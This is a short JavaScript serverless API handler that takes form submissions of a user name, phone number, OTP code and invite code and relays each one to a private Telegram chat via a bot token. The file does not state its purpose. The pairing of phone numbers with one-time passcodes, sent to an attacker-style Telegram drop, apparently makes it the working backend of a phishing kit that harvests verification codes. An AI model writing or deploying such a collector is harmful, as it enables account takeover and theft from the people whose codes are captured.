export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    return res.status(500).json({ error: "Missing Telegram configuration" });
  }

  const { eventType, userName, phone, otpCode, inviteCode } = req.body || {};

  const text = [
    "📩 *New Form Submission*",
    `• *Event:* ${eventType || "Submit"}`,
    `• *User Name:* ${userName || "-"}`,
    `• *Phone:* ${phone || "-"}`,
    `• *OTP / Code:* ${otpCode || "-"}`,
    `• *Invite Code:* ${inviteCode || "-"}`
  ].join("\n");

  try {
    const tgResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: "Markdown"
      })
    });

    const result = await tgResponse.json();
    if (!tgResponse.ok) {
      return res.status(502).json({ error: "Telegram delivery failed", details: result });
    }

    return res.status(200).json({ ok: true });
  } catch (err) {
    return res.status(500).json({ error: "Internal server error" });
  }
}
